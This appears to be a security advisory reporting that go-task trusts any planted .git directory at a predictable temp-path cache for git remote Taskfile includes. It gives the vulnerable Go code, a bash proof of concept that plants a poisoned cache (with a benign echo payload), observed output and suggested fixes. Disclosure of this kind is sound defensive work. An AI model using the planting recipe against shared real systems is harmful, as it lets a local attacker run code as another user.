# go-task: git-include cache uses a predictable temp path with no integrity check

**Package**: github.com/go-task/task
**Ecosystem**: Go
**Affected versions**: all versions with git-based remote Taskfile includes; tested at `3dcaa7db` (v3.51.1 nightly tip)
**Patched versions**: none
**Severity**: Medium
**CVSS 3.1**: `AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N` — **5.0**
**CWE**: CWE-377 (Insecure Temporary File), CWE-345 (Insufficient Verification of Data Authenticity)

## Summary

When go-task fetches a remote Taskfile over git, it caches the clone at a predictable
path under the system temp directory, keyed only on public URL components. The cache
hit-path trusts any directory that contains a `.git` subdirectory — no checksum, no
remote-URL verification, no trust prompt for changed content. A local attacker who can
write to the temp directory can plant a poisoned cache that is loaded and executed as
the victim, while the trust prompt displays the legitimate URL.

## Root cause

`taskfile/node_git.go:131` (cache path) and the surrounding hit-check:

```go
cacheDir := filepath.Join(os.TempDir(), "task-git-repos", cacheKey)
gitDir := filepath.Join(cacheDir, ".git")
if _, err := os.Stat(gitDir); err == nil {
    return cacheDir, nil   // cache hit — returned with NO integrity verification, NO network
}
// ... otherwise clone
```

Cache key, derived entirely from public URL parts (`node_git.go:235`):

```go
func (node *GitNode) repoCacheKey() string {
    repoPath := strings.Trim(node.url.Path, "/")
    ref := node.ref
    if ref == "" {
        ref = "_default_"
    }
    return filepath.Join(node.url.Host, repoPath, ref)
}
```

For `https://github.com/go-task/task.git` the key is
`github.com/go-task/task.git/_default_`.

> **Correction vs. earlier drafts:** the path is `os.TempDir()/task-git-repos/...`,
> **not** a hardcoded `/tmp/...`. On macOS `os.TempDir()` returns `$TMPDIR`
> (`/var/folders/.../T/`); the `/tmp/...` form is correct only on Linux where
> `TMPDIR` is typically unset. Advisories should cite `os.TempDir()`.

## The gap

The HTTP remote-include path (`taskfile/reader.go`) verifies content: it computes a
checksum, compares against the pinned value, and prompts on change
(`taskfileChangedPrompt`). The git path has none of this — a `.git` directory planted
by anyone is trusted identically to a legitimate clone.

## Proof of concept

Verified against a from-source build (commit `3dcaa7db`), reproduced **with the
network denied** to prove no clone occurs.

Step 1 — plant the poisoned cache (local write to the temp dir). Use the real temp
dir; on macOS this is `$TMPDIR`, on Linux `/tmp`:

```bash
CACHE="$(go env GOTMPDIR)"; [ -z "$CACHE" ] && CACHE="${TMPDIR:-/tmp}"
DIR="$CACHE/task-git-repos/github.com/go-task/task.git/_default_"
mkdir -p "$DIR" && cd "$DIR"
git init -q && git commit --allow-empty -m init -q
cat > Taskfile.yml <<'YAML'
version: '3'
tasks:
  default:
    cmds:
      - 'echo "CACHE_POISONED=true"'
YAML
```

Step 2 — victim's Taskfile.yml includes the legitimate repo:

```yaml
version: '3'
includes:
  lib:
    taskfile: https://github.com/go-task/task.git
```

Step 3 — victim runs:

```bash
$ TASK_X_REMOTE_TASKFILES=1 task lib:default --yes
```

Observed output:

```
The task you are attempting to run depends on the remote Taskfile at "https://github.com/go-task/task.git".
--- Make sure you trust the source of this Taskfile before continuing ---
Continue? [assuming yes]
task: [lib:default] echo "CACHE_POISONED=true"
CACHE_POISONED=true
```

Re-running the exact command under `sandbox-exec` with `(deny network*)` still printed
`CACHE_POISONED=true` — a real github clone would have failed, so the planted `.git`
cache was trusted with zero network and zero integrity check. The trust prompt shows
the legitimate URL while serving attacker content.

## Important constraint (durability / TOCTOU)

`taskfile/reader.go:252` runs `defer CleanGitCache()`, which `os.RemoveAll`s the
`task-git-repos` directory after each run. The cache is therefore **not durable**
between runs — this is not persistent poisoning. The realistic exploit is a local
**TOCTOU**: the attacker plants (or continuously re-plants in a loop) the cache dir in
the window before the victim's `os.Stat(gitDir)` hit-check. On a shared host this race
is winnable with a tight re-plant loop, but the difficulty is real and is reflected in
the `AC:H` score.

## Impact

A local attacker with write access to the shared temp dir (any user on a multi-user
host, shared CI runner, or shared `/tmp` container volume) can execute code as another
user who runs `task` with a git-based remote include. The misleading trust prompt
(legitimate URL, attacker content) aids the deception.

## Suggested fix

1. Use a per-user cache dir with `0700` perms (e.g. under `os.UserCacheDir()`), not a
   world-writable shared temp dir.
2. On cache hit, verify the cached repo's `origin` remote matches the expected URL;
   `RemoveAll` and re-clone on mismatch.
3. Extend the HTTP path's checksum/trust-on-change verification to git-cached content.
